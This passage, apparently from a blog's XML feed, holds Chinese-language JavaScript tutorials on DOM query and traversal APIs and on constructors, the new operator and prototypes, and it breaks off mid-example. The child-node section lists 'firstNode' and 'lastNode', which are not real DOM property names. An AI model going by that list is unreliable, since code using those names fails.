title="document.getElementById"></a>document.getElementById</h2><p>这个接口很简单，根据元素id返回元素，返回值是Element类型，如果不存在该元素，则返回null。<br>使用这个接口有几点要注意：</p><ol><li>元素的Id是大小写敏感的，一定要写对元素的id</li><li>HTML文档中可能存在多个id相同的元素，则返回第一个元素</li><li>只从文档中进行搜索元素，如果创建了一个元素并指定id，但并没有添加到文档中，则这个元素是不会被查找到的</li></ol><h2 id="document-getElementsByTagName"><a href="#document-getElementsByTagName" class="headerlink" title="document.getElementsByTagName"></a>document.getElementsByTagName</h2><p>这个接口根据元素标签名获取元素，返回一个即时的HTMLCollection类型，什么是即时的HTMLCollection类型呢？我们来看看这个示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;div1&lt;/div&gt;</span><br><span class="line">&lt;div&gt;div2&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;显示数量&quot; id=&quot;btnShowCount&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;新增div&quot; id=&quot;btnAddDiv&quot;/&gt;</span><br><span class="line"></span><br><span class="line">var divList = document.getElementsByTagName(&quot;div&quot;);</span><br><span class="line">document.getElementById(&quot;btnAddDiv&quot;).onclick = function()&#123;</span><br><span class="line">var div = document.createElement(&quot;div&quot;);</span><br><span class="line">div.textContent =&quot;div&quot; + (divList.length+1);</span><br><span class="line">document.body.appendChild(div);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;btnShowCount&quot;).onclick = function()&#123;</span><br><span class="line">        alert(divList.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中有两个按钮，一个按钮是显示HTMLCollection元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到HTMLCollcetion元素是即时的表示该集合是随时变化的，也就是是文档中有几个div，它会随时进行变化，当我们新增一个div后，再访问HTMLCollection时，就会包含这个新增的div。<br>使用document.getElementsByTagName这个方法有几点要注意：</p><ol><li>如果要对HTMLCollection集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率</li><li>如果没有存在指定的标签，该接口返回的不是null，而是一个空的HTMLCollection</li><li>“*”表示所有标签</li></ol><h2 id="document-getElementsByName"><a href="#document-getElementsByName" class="headerlink" title="document.getElementsByName"></a>document.getElementsByName</h2><p>getElementsByName主要是通过指定的name属性来获取元素，它返回一个即时的NodeList对象。<br>使用这个接口主要要注意几点：</p><ol><li>返回对象是一个即时的NodeList，它是随时变化的</li><li>在HTML元素中，并不是所有元素都有name属性，比如div是没有name属性的，但是如果强制设置div的name属性，它也是可以被查找到的</li><li>在IE中，如果id设置成某个值，然后传入getElementsByName的参数值和id值一样，则这个元素是会被找到的，所以最好不好设置同样的值给id和name</li></ol><h2 id="document-getElementsByClassName"><a href="#document-getElementsByClassName" class="headerlink" title="document.getElementsByClassName"></a>document.getElementsByClassName</h2><p>这个API是根据元素的class返回一个即时的HTMLCollection，用法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var elements = document.getElementsByClassName(names);</span><br></pre></td></tr></table></figure><p>这个接口有下面几点要注意：</p><ol><li>返回结果是一个即时的HTMLCollection，会随时根据文档结构变化</li><li>IE9以下浏览器不支持</li><li>如果要获取2个以上classname，可传入多个classname，每个用空格相隔，例如</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var elements = document.getElementsByClassName(&quot;test1 test2&quot;);</span><br></pre></td></tr></table></figure><p>document.querySelector和document.querySelectorAll<br>这两个api很相似，通过css选择器来查找元素，注意选择器要符合CSS选择器的规则。<br>首先来介绍一下document.querySelector。<br>document.querySelector返回第一个匹配的元素，如果没有匹配的元素，则返回null。<br>注意，由于返回的是第一个匹配的元素，这个api使用的深度优先搜索来获取元素。我们来看这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;span class=&quot;test&quot;&gt;第三级的span&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;test&quot;&gt;</span><br><span class="line">    同级的第二个div</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;btnGet&quot; value=&quot;获取test元素&quot; /&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;btnGet&quot;).addEventListener(&quot;click&quot;,function()&#123;</span><br><span class="line">var element = document.querySelector(&quot;.test&quot;);</span><br><span class="line">alert(element.textContent);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这个例子很简单，就是两个class都包含“test”的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过querySelector获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素。</p><p>document.querySelectorAll的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符，我们来看看下面这个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;test&quot;&gt;</span><br><span class="line">    class为test</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;test&quot;&gt;</span><br><span class="line">    id为test</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input id=&quot;btnShow&quot; type=&quot;button&quot; value=&quot;显示内容&quot; /&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;btnShow&quot;).addEventListener(&quot;click&quot;,function()&#123;</span><br><span class="line">var elements = document.querySelectorAll(&quot;#test,.test&quot;);</span><br><span class="line">for(var i = 0,length = elements.length;i&lt;length;i++)&#123;</span><br><span class="line">alert(elements[i].textContent);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这段代码通过querySelectorAll，使用id选择器和class选择器选择了两个元素，并依次输出其内容。要注意两点：<br>（1）querySelectorAll也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关<br>（2）返回的是一个非即时的NodeList，也就是说结果不会随着文档树的变化而变化</p><p>兼容性问题：querySelector和querySelectorAll在ie8以下的浏览器不支持。</p><h1 id="节点关系型api"><a href="#节点关系型api" class="headerlink" title="节点关系型api"></a>节点关系型api</h1><p>在html文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等，下面我们依次来看看每一种关系。</p><h2 id="父关系型api"><a href="#父关系型api" class="headerlink" title="父关系型api"></a>父关系型api</h2><ul><li>parentNode：每个节点都有一个parentNode属性，它表示元素的父节点。Element的父节点可能是Element，Document或DocumentFragment。</li><li>parentElement：返回元素的父元素节点，与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null</li></ul><h2 id="兄弟关系型api"><a href="#兄弟关系型api" class="headerlink" title="兄弟关系型api"></a>兄弟关系型api</h2><ul><li><p>previousSibling：节点的前一个节点，如果该节点是第一个节点，则为null。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下。</p></li><li><p>previousElementSibling：返回前一个元素节点，前一个节点必须是Element，注意IE9以下浏览器不支持。</p></li><li><p>nextSibling：节点的后一个节点，如果该节点是最后一个节点，则为null。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下。</p></li><li><p>nextElementSibling：返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持。</p></li></ul><h2 id="子关系型api"><a href="#子关系型api" class="headerlink" title="子关系型api"></a>子关系型api</h2><ul><li>childNodes：返回一个即时的NodeList，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。</li><li>children：一个即时的HTMLCollection，子节点都是Element，IE9以下浏览器不支持。</li><li>firstNode：第一个子节点</li><li>lastNode：最后一个子节点</li><li>hasChildNodes方法：可以用来判断是否包含子节点。</li></ul><h1 id="元素属性型api"><a href="#元素属性型api" class="headerlink" title="元素属性型api"></a>元素属性型api</h1><h2 id="setAttribute"><a href="#setAttribute" class="headerlink" title="setAttribute"></a>setAttribute</h2><p>setAttribute：根据名称和值修改元素的特性，用法如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.setAttribute(name, value);</span><br></pre></td></tr></table></figure><p>其中name是特性名，value是特性值。如果元素不包含该特性，则会创建该特性并赋值。<br>如果元素本身包含指定的特性名为属性，则可以世界访问属性进行赋值，比如下面两条代码是等价的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element.setAttribute(&quot;id&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">element.id = &quot;test&quot;;</span><br></pre></td></tr></table></figure><h2 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a>getAttribute</h2><p>getAttribute返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var value = element.getAttribute(&quot;id&quot;);</span><br></pre></td></tr></table></figure><h1 id="元素样式型api"><a href="#元素样式型api" class="headerlink" title="元素样式型api"></a>元素样式型api</h1><h2 id="window-getComputedStyle"><a href="#window-getComputedStyle" class="headerlink" title="window.getComputedStyle"></a>window.getComputedStyle</h2><p>window.getComputedStyle是用来获取应用到元素后的样式，假设某个元素并未设置高度而是通过其内容将其高度撑开，这时候要获取它的高度就要用到getComputedStyle，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var style = window.getComputedStyle(element[, pseudoElt]);</span><br></pre></td></tr></table></figure><p>element是要获取的元素，pseudoElt指定一个伪元素进行匹配。<br>返回的style是一个CSSStyleDeclaration对象。<br>通过style可以访问到元素计算后的样式</p><h2 id="getBoundingClientRect"><a href="#getBoundingClientRect" class="headerlink" title="getBoundingClientRect"></a>getBoundingClientRect</h2><p>getBoundingClientRect用来返回元素的大小以及相对于浏览器可视窗口的位置，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var clientRect = element.getBoundingClientRect();</span><br></pre></td></tr></table></figure><p>clientRect是一个DOMRect对象，包含left，top，right，bottom，它是相对于可视窗口的距离，滚动位置发生改变时，它们的值是会发生变化的。除了IE9以下浏览器，还包含元素的height和width等数据，具体可查看链接。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h1><ul><li>阮一峰：<a href="https://wangdoc.com/javascript/dom/index.html">JavaScript教程</a></li><li>狼狼的蓝胖子：<a href="http://luopq.com/2015/11/30/javascript-dom/">Javascript操作DOM常用API总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型与原型链</title>
      <link href="/posts/e8f85541/"/>
      <url>/posts/e8f85541/</url>
      
        <content type="html"><![CDATA[<p><strong>再讲原型与原型链的前提下先讲些概念方便理解</strong></p><hr><h1 id="对象是什么"><a href="#对象是什么" class="headerlink" title="对象是什么"></a>对象是什么</h1><p>面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。</p><p>每一个对象都是功能中心，具有明确分工，可以完成接受信息、处理数据、发出信息等任务。对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。</p><p>那么，“对象”（object）到底是什么？我们从两个层次来理解。</p><p>（1）对象是单个实物的抽象。</p><p>一本书、一辆汽车、一个人都可以是对象，一个数据库、一张网页、一个与远程服务器的连接也可以是对象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。</p><p>（2）对象是一个容器，封装了属性（property）和方法（method）。</p><p>属性是对象的状态，方法是对象的行为（完成某种任务）。比如，我们可以把动物抽象为animal对象，使用“属性”记录具体是那一种动物，使用“方法”表示动物的某种行为（奔跑、捕猎、休息等等）。</p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>面向对象编程的第一步，就是要生成对象。前面说过，对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。</p><p>典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。</p><p>JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。</p><p>构造函数就是一个普通的函数，但是有自己的特征和用法。</p><p>var Vehicle &#x3D; function () {<br>  this.price &#x3D; 1000;<br>};<br>上面代码中，Vehicle就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。</p><p>构造函数的特点有两个。</p><p>函数体内部使用了this关键字，代表了所要生成的对象实例。<br>生成对象的时候，必须使用new命令。<br>下面先介绍new命令。</p><h2 id="new-命令"><a href="#new-命令" class="headerlink" title="new 命令"></a>new 命令</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>new命令的作用，就是执行构造函数，返回一个实例对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var Vehicle = function () &#123;</span><br><span class="line">  this.price = 1000;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var v = new Vehicle();</span><br><span class="line">v.price // 1000</span><br></pre></td></tr></table></figure><p>上面代码通过new命令，让构造函数Vehicle生成一个实例对象，保存在变量v中。这个新生成的实例对象，从构造函数Vehicle得到了price属性。new命令执行时，构造函数内部的this，就代表了新生成的实例对象，this.price表示实例对象有一个price属性，值是1000。</p><p>使用new命令时，根据需要，构造函数也可以接受参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var Vehicle = function (p) &#123;</span><br><span class="line">  this.price = p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>var v &#x3D; new Vehicle(500);<br>new命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。下面两行代码是等价的，但是为了表示这里是函数调用，推荐使用括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 推荐的写法</span><br><span class="line">var v = new Vehicle();</span><br><span class="line">// 不推荐的写法</span><br><span class="line">var v = new Vehicle;</span><br></pre></td></tr></table></figure><p>一个很自然的问题是，如果忘了使用new命令，直接调用构造函数会发生什么事？</p><p>这种情况下，构造函数就变成了普通函数，并不会生成实例对象。而且由于后面会说到的原因，this这时代表全局对象，将造成一些意想不到的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var Vehicle = function ()&#123;</span><br><span class="line">  this.price = 1000;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var v = Vehicle();</span><br><span class="line">v // undefined</span><br><span class="line">price // 1000</span><br></pre></td></tr></table></figure><p>上面代码中，调用Vehicle构造函数时，忘了加上new命令。结果，变量v变成了undefined，而price属性变成了全局变量。因此，应该非常小心，避免不使用new命令、直接调用构造函数。</p><p>为了保证构造函数必须与new命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上use strict。这样的话，一旦忘了使用new命令，直接调用构造函数就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Fubar(foo, bar)&#123;</span><br><span class="line">  &#x27;use strict&#x27;;</span><br><span class="line">  this._foo = foo;</span><br><span class="line">  this._bar = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fubar()</span><br><span class="line">// TypeError: Cannot set property &#x27;_foo&#x27; of undefined</span><br></pre></td></tr></table></figure><p>上面代码的Fubar为构造函数，use strict命令保证了该函数在严格模式下运行。由于严格模式中，函数内部的this不能指向全局对象，默认等于undefined，导致不加new调用会报错（JavaScript 不允许对undefined添加属性）。</p><p>另一个解决办法，构造函数内部判断是否使用new命令，如果发现没有使用，则直接返回一个实例对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Fubar(foo, bar) &#123;</span><br><span class="line">  if (!(this instanceof Fubar)) &#123;</span><br><span class="line">    return new Fubar(foo, bar);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  this._foo = foo;</span><br><span class="line">  this._bar = bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fubar(1, 2)._foo // 1</span><br><span class="line">(new Fubar(1, 2))._foo // 1</span><br></pre></td></tr></table></figure><p>上面代码中的构造函数，不管加不加new命令，都会得到同样的结果。</p><h3 id="new-命令的原理"><a href="#new-命令的原理" class="headerlink" title="new 命令的原理"></a>new 命令的原理</h3><p>使用new命令时，它后面的函数依次执行下面的步骤。</p><p>创建一个空对象，作为将要返回的对象实例。<br>将这个空对象的原型，指向构造函数的prototype属性。<br>将这个空对象赋值给函数内部的this关键字。<br>开始执行构造函数内部的代码。<br>也就是说，构造函数内部，this指的是一个新生成的空对象，所有针对this的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即this对象），将其“构造”为需要的样子。</p><p>如果构造函数内部有return语句，而且return后面跟着一个对象，new命令会返回return语句指定的对象；否则，就会不管return语句，返回this对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var Vehicle = function () &#123;</span><br><span class="line">  this.price = 1000;</span><br><span class="line">  return 1000;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(new Vehicle()) === 1000</span><br><span class="line">// false</span><br></pre></td></tr></table></figure><p>上面代码中，构造函数Vehicle的return语句返回一个数值。这时，new命令就会忽略这个return语句，返回“构造”后的this对象。</p><p>但是，如果return语句返回的是一个跟this无关的新对象，new命令会返回这个新对象，而不是this对象。这一点需要特别引起注意。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var Vehicle = function ()&#123;</span><br><span class="line">  this.price = 1000;</span><br><span class="line">  return &#123; price: 2000 &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(new Vehicle()).price</span><br><span class="line">// 2000</span><br></pre></td></tr></table></figure><p>上面代码中，构造函数Vehicle的return语句，返回的是一个新对象。new命令会返回这个对象，而不是this对象。</p><p>另一方面，如果对普通函数（内部没有this关键字的函数）使用new命令，则会返回一个空对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function getMessage() &#123;</span><br><span class="line">  return &#x27;this is a message&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var msg = new getMessage();</span><br><span class="line"></span><br><span class="line">msg // &#123;&#125;</span><br><span class="line">typeof msg // &quot;object&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，getMessage是一个普通函数，返回一个字符串。对它使用new命令，会得到一个空对象。这是因为new命令总是返回一个对象，要么是实例对象，要么是return语句指定的对象。本例中，return语句返回的是字符串，所以new命令就忽略了该语句。</p><p>new命令简化的内部流程，可以用下面的代码表示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function _new(/* 构造函数 */ constructor, /* 构造函数参数 */ params) &#123;</span><br><span class="line">  // 将 arguments 对象转为数组</span><br><span class="line">  var args = [].slice.call(arguments);</span><br><span class="line">  // 取出构造函数</span><br><span class="line">  var constructor = args.shift();</span><br><span class="line">  // 创建一个空对象，继承构造函数的 prototype 属性</span><br><span class="line">  var context = Object.create(constructor.prototype);</span><br><span class="line">  // 执行构造函数</span><br><span class="line">  var result = constructor.apply(context, args);</span><br><span class="line">  // 如果返回结果是对象，就直接返回，否则返回 context 对象</span><br><span class="line">  return (typeof result === &#x27;object&#x27; &amp;&amp; result != null) ? result : context;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 实例</span><br><span class="line">var actor = _new(Person, &#x27;张三&#x27;, 28);</span><br></pre></td></tr></table></figure><h1 id="原型对象概述"><a href="#原型对象概述" class="headerlink" title="原型对象概述"></a>原型对象概述</h1><h2 id="构造函数的缺点"><a href="#构造函数的缺点" class="headerlink" title="构造函数的缺点"></a>构造函数的缺点</h2><p>JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Cat (name, color) &#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.color = color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var cat1 = new Cat(&#x27;大毛&#x27;, &#x27;白色&#x27;);</span><br><span class="line"></span><br><span class="line">cat1.name // &#x27;大毛&#x27;</span><br><span class="line">cat1.color // &#x27;白色&#x27;</span><br></pre></td></tr></table></figure><p>上面代码中，Cat函数是一个构造函数，函数内部定义了name属性和color属性，所有实例对象（上例是cat1）都会生成这两个属性，即这两个属性会定义在实例对象上面。</p><p>通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Cat(name, color) &#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.color = color;</span><br><span class="line">  this.meow = function () &#123;</span><br><span class="line">    console.log(&#x27;喵喵&#x27;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var cat1 = new Cat(&#x27;大毛&#x27;, &#x27;白色&#x27;);</span><br><span class="line">var cat2 = new Cat(&#x27;二毛&#x27;, &#x27;黑色&#x27;);</span><br><span class="line"></span><br><span class="line">cat1.meow === cat2.meow</span><br><span class="line">// false</span><br></pre></td></tr></table></figure><p>上面代码中，cat1和cat2是同一个构造函数的两个实例，它们都具有meow方法。由于meow方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个meow方法。这既没有必要，又浪费系统资源，因为所有meow方法都是同样的行为，完全应该共享。</p><p>这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。</p><h2 id="prototype-属性的作用"><a href="#prototype-属性的作用" class="headerlink" title="prototype 属性的作用"></a>prototype 属性的作用</h2><p>JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。</p><p>下面，先看怎么为对象指定原型。JavaScript 规定，每个函数都有一个prototype属性，指向一个对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function f() &#123;&#125;</span><br><span class="line">typeof f.prototype // &quot;object&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，函数f默认具有prototype属性，指向一个对象。</p><p>对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Animal(name) &#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Animal.prototype.color = &#x27;white&#x27;;</span><br><span class="line"></span><br><span class="line">var cat1 = new Animal(&#x27;大毛&#x27;);</span><br><span class="line">var cat2 = new Animal(&#x27;二毛&#x27;);</span><br><span class="line"></span><br><span class="line">cat1.color // &#x27;white&#x27;</span><br><span class="line">cat2.color // &#x27;white&#x27;</span><br></pre></td></tr></table></figure><p>上面代码中，构造函数Animal的prototype属性，就是实例对象cat1和cat2的原型对象。原型对象上添加一个color属性，结果，实例对象都共享了该属性。</p><p>原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Animal.prototype.color = &#x27;yellow&#x27;;</span><br><span class="line"></span><br><span class="line">cat1.color // &quot;yellow&quot;</span><br><span class="line">cat2.color // &quot;yellow&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，原型对象的color属性的值变为yellow，两个实例对象的color属性立刻跟着变了。这是因为实例对象其实没有color属性，都是读取原型对象的color属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。</p><p>如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat1.color = &#x27;black&#x27;;</span><br><span class="line"></span><br><span class="line">cat1.color // &#x27;black&#x27;</span><br><span class="line">cat2.color // &#x27;yellow&#x27;</span><br><span class="line">Animal.prototype.color // &#x27;yellow&#x27;;</span><br></pre></td></tr></table></figure><p>上面代码中，实例对象cat1的color属性改为black，就使得它不再去原型对象读取color属性，后者的值依然为yellow。</p><p>总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Animal.prototype.walk = function () &#123;</span><br><span class="line">  console.log(this.name + &#x27; is 